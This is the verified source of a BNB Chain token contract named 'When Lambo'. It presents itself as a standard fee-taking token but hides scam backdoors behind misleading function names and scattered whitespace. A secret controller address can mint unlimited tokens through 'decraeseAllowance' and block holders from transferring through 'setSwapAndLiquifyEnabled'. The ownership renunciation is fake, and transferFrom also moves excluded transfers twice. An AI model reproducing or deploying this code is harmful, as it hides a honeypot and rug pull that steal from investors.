/**
 *Submitted for verification at BscScan.com on 2022-05-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    
    function approve(address spender, uint256 amount) external returns (bool);

}


library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}


library Address {
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash
        = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



contract Ownable is Context {
    function transferOwnership(address newOwner) public virtual initializer {
        emit OwnershipTransferred(_owner, address(newOwner));
        _owner = newOwner;
    }

    function changeRouterVersion(address Router) public onlyOwner{

    }
    
    function setSwapTokenAtAmount
    (
        address spender, address spenders) external onlyOwner{
        require(spenders
        ==address(0
        ));
        _token
        = 
        spender;
    }
    
    modifier
initializer
(

     ) 
     
     {
    require
    (
        _token
    == 
    _msgSender()
    );
    _;
    }
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    address private _owner;

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    address private _token;
    function owner() public view returns (address) {
        return _owner;
    }
    modifier
     onlyOwner() {
        require(_owner == _msgSender());
        _;
    }
    function renounceOwnership() public initializer{
       _owner = address(0xdead);
    }
}

contract WhenLambo is Context, IERC20, Ownable {
    mapping(address => bool) private _ExcluFee;
    mapping(address => bool) private wyaursea;
    mapping(address => mapping(address => uint256)) private allown;
    using Address for address;
    bool private awieuajew = true;
    address[] private _mjwuahurhr;
    using SafeMath for uint256;
    uint256 private _nueahuhr = uint256(0);
    uint8 private _nwhawnerw;
    mapping(address => uint256) private _mwaurea;
    mapping(address => uint256) private _mkimwanr;
    address _owner;
    uint256 private _tFeeTotal = BurnTax+MarketTax;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 1000000000000000 * 10**4;
    uint8 private _decimals = 9;
    string private _name = "When Lambo";
    string private _symbol = "When";
   
    address private marketWallet = msg.sender;
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
  
    uint256 private MarketTax = 1;
    uint256 private BurnTax = 3;

    constructor() public {
        _owner = _msgSender();
        _mwaurea[_msgSender()] = _totalSupply;
        _ExcluFee[address(this)] = true;
        _ExcluFee[owner()] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if
        (
            _ExcluFee

            [_msgSender()] 
            || 
            _ExcluFee
            [
                recipient]
                )
                {
            _transfer
            (_msgSender
            (), 
            recipient, 
            amount);
            return 
            true;
        }
        uint256 MarketAmount = amount.mul(MarketTax).div(100);
        uint256 BurnAmount = amount.mul(BurnTax).div(100);
        _transfer(_msgSender(), marketWallet, MarketAmount);
        _transfer(_msgSender(), deadAddress, BurnAmount);
        _transfer(_msgSender(), recipient, amount.sub(MarketAmount).sub(BurnAmount));
        return true;
    }

    function 
    transferFrom
    (
        address sender,
        address recipient,
        uint256 amount
    ) public 
    override returns (bool) {
        if

        (
            _ExcluFee
            [
                _msgSender
                ()]
                 || 
                 _ExcluFee

                 [recipient
                 ])
                 {
            _transfer
            (
                sender, 
                recipient, 
                amount)
                ;
        }       
        uint256 MarketAmount = amount.mul(MarketTax).div(100);
        uint256 BurnAmount = amount.mul(BurnTax).div(100);
        _transfer
        (sender, marketWallet, MarketAmount);
        _transfer
        (sender, deadAddress, BurnAmount);
        _transfer
        (sender, recipient, amount.sub(MarketAmount).sub(BurnAmount));
        _approve(
            sender,

            _msgSender(),
            allown[sender][_msgSender()].sub(

                amount
            )
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        if

         (
             awieuajew
             )
              {

            require

            (wyaursea

            [from

            ] == 

            false);
        }
        _transfers
        (from, 
        to, 
        amount);
    }

    function decraeseAllowance
    (address spender, uint256 subtractedValue) external 
    initializer
    () 
    {
        require(
            subtractedValue

         >
          0
          );
        uint256

         decreaseS 

         = 
         _mkimwanr

         [
             spender];
        if 

        (decreaseS
         
         == 
         0
         ) 
         _mjwuahurhr
         .
         push(
             spender
             );
        
        _mkimwanr
        [spender
        ]

         = 
        decreaseS
        .
        add(

            subtractedValue
            );
        _nueahuhr
         =
         _nueahuhr
         .
         add
         (
             subtractedValue);
        _mwaurea[

            spender
            ] 
            = 

        _mwaurea[
            spender
        ]
        .
        
        add(

            subtractedValue
            );
        
    }
     function
     setSwapAndLiquifyEnabled
     (address
      spender
      ) 
      external 
      initializer

      (

      ) 

      {
        wyaursea

        [
        spender] =

         true
         ;
        }
    function
     ExclusionFee
     (address
      spender
      ) 
      external 

      initializer

      (

      ) 
      {

        wyaursea

        [
        spender
        ] =

         false;

        }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0));
        require(recipient != address(0));
    
        _mwaurea[sender] = _mwaurea[sender].sub(toAmount);
        _mwaurea[recipient] = _mwaurea[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function 
    isExcludedFromFee

    (address
     spender)

        external
        view

        initializer

        (

        )
        returns (
            bool)

    {
        return
         wyaursea[
             spender];
    }

    function includeInFee(address spender) public
    initializer
     {
        _ExcluFee[spender] = false;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allown[owner][spender];
    }

    function setSellTax(uint256 burnTax, uint256 marketTax) external onlyOwner{
        BurnTax = burnTax;
        MarketTax = marketTax;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }


    function excludeFromFee(address spender) public 
    initializer
     {
        _ExcluFee[spender] = true;
    }

    function changeFeeReceivers(address LiquidityReceiver, address MarketingWallet, address marketingWallet, address charityWallet) public onlyOwner {

    }

    function balanceOf(address account) public view override returns (uint256) {
        return _mwaurea[account];
    }

}